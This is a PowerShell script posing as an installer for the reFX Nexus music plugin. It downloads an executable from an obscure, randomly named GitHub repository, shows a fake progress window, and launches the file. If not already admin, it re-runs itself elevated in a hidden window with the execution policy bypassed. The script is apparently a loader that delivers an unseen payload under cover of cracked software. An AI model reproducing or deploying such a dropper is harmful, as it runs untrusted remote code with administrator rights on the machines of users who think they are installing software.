$tempScript = Join-Path $env:TEMP 'nexus_elevated.ps1'

$elevatedCode = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$logPath = Join-Path $env:TEMP 'nexus_install.log'
try {
    $ErrorActionPreference = 'Stop'
    $downloadUrl = 'https://raw.githubusercontent.com/AmplitudeQuail/dlqmjdez/main/reFX%20Nexus%20v5.4.14.exe'
    $outputPath  = Join-Path $env:TEMP 'reFX Nexus v5.4.14.exe'

    $form = New-Object System.Windows.Forms.Form
    $form.Text = 'reFX Nexus Installer'
    $form.Size = New-Object System.Drawing.Size(420, 150)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true

    $label = New-Object System.Windows.Forms.Label
    $label.Text = 'Downloading reFX Nexus v5.4.14...'
    $label.Location = New-Object System.Drawing.Point(15, 15)
    $label.Size = New-Object System.Drawing.Size(380, 25)
    $label.Font = New-Object System.Drawing.Font('Segoe UI', 10)
    $form.Controls.Add($label)

    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Location = New-Object System.Drawing.Point(15, 45)
    $progressBar.Size = New-Object System.Drawing.Size(380, 25)
    $progressBar.Style = 'Continuous'
    $progressBar.Minimum = 0
    $progressBar.Maximum = 100
    $form.Controls.Add($progressBar)

    $percentLabel = New-Object System.Windows.Forms.Label
    $percentLabel.Text = '0%'
    $percentLabel.Location = New-Object System.Drawing.Point(15, 75)
    $percentLabel.Size = New-Object System.Drawing.Size(380, 25)
    $percentLabel.Font = New-Object System.Drawing.Font('Segoe UI', 9)
    $percentLabel.TextAlign = 'MiddleCenter'
    $form.Controls.Add($percentLabel)

    $wc = New-Object System.Net.WebClient

    $wc.add_DownloadProgressChanged({
        param($s, $e)
        if ($form.IsHandleCreated) {
            $form.BeginInvoke([Action]{
                $progressBar.Value = [int]$e.ProgressPercentage
                $percentLabel.Text = "$([int]$e.ProgressPercentage)%"
            })
        }
    })

    $wc.add_DownloadFileCompleted({
        $form.BeginInvoke([Action]{
            $label.Text = 'Launching installer...'
            $progressBar.Value = 100
            $percentLabel.Text = '100%'
            $form.Close()
        })
    })

    $wc.DownloadFileAsync([Uri]$downloadUrl, $outputPath)
    $form.ShowDialog() | Out-Null

    if (-not (Test-Path $outputPath)) { throw 'Download failed: file was not saved.' }

    Start-Process -FilePath $outputPath
    Start-Sleep -Seconds 2
}
catch {
    $err = $_ | Out-String
    $err | Out-File -FilePath $logPath -Encoding UTF8 -Append
    [System.Windows.Forms.MessageBox]::Show("Download failed:`n`n$err", 'reFX Nexus Installer', 'OK', 'Error') | Out-Null
}
'@

$elevatedCode | Out-File -FilePath $tempScript -Encoding UTF8

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    & $tempScript
} else {
    Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`""
    exit
}
